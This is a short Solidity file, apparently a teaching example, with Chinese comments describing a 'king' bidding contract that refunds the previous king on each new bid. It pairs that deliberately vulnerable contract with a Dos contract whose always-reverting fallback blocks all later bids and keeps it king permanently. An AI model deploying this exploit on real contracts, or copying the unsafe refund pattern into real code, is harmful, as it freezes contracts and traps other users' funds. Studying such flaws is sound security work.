pragma solidity ^0.4.18;   //國王遊戲，假設A花$200成為國王，B需要花費至少$200+100才可篡位(架設花350);此時會將$200+100補償給A
                          // 由於B的fallback為revert()，所以之後任何金額在21行皆會失敗，B可以阻斷此合約執行，永久成為國王。
contract CallToTheUnknown {


    address public king;
    uint public highestBid;

    modifier onlyKing{
        require(msg.sender == king);
        _;
    }
    function CallToTheUnknown() public payable{
        king = msg.sender;
        highestBid = 100;
    }


    function() public payable {
        require(msg.value > highestBid);
        if(!king.call.value(highestBid)()){revert();}
        king = msg.sender;
        highestBid = msg.value+100;
    }
    function queryBalance() public view returns(uint) {
        return this.balance;
     }

    function getbalance() public {
        require(king.send(this.balance));
    }
}

contract Dos {
  // call become leader
  function BecomeKing(address _address, uint Amount)public {
        if(!_address.call.value(Amount)())
        revert();
  }

  function Dos() public payable{}

  // reverts anytime it receives ether, thus cancelling out the change of the leader
  function() public payable {
        revert();
  }

  function query() public view returns(uint){
      return this.balance;
  }

}
